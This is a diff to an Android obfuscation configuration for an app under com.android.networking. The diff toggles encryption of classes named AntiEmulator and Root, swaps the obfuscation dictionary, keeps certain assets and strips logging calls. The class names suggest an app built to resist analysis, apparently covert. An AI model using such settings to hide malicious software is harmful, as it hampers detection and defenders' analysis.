@@ -1,10 +1,10 @@
 
 -verbose
 #-encryptclasses com.android.networking.util.AntiEmulator,com.android.networking.MessagesDecrypt,com.android.networking.Root
--encryptclasses com.android.networking.util.AntiEmulator,com.android.networking.Root
+#-encryptclasses com.android.networking.util.AntiEmulator,com.android.networking.Root
 
 #-encryptclasses com.android.networking.*
--encryptstrings "17_*","20_*","32_*","36_*"
+#-encryptstrings "17_*","20_*","32_*","36_*"
 
 #-dontobfuscate
 #-dontoptimize
@@ -21,7 +21,7 @@
 -optimizations !method/marking/final
 #-optimizations !method/*
 
--classobfuscationdictionary classdictionary.txt
+-classobfuscationdictionary "compact.txt"
 
 #togliere l'offuscamento di com.android.networking.Core.isServiceRunning
 -keepclassmembers class com.android.networking.Core {
@@ -31,7 +31,9 @@
 -keepresourcexmlattributenames assets/c.bin, assets/r.bin,
     manifest/installLocation,
     manifest/versionCode,
-    manifest/application/*/intent-filter/*/name
+    manifest/application/*/intent-filter/*/name,
+    res/layout/main.xml,
+    res/values/*
 
 -keep public class com.android.networking.gui.CGui
 -keep public class com.android.networking.BM
@@ -39,3 +41,12 @@
 -keep public class com.android.networking.listener.BSt
 -keep public class com.android.networking.listener.BSm
 -keep public class com.android.networking.listener.BC
+
+-assumenosideeffects class android.util.Log {
+    public static boolean isLoggable(java.lang.String, int);
+    public static int v(...);
+    public static int i(...);
+    public static int w(...);
+    public static int d(...);
+    public static int e(...);
+}
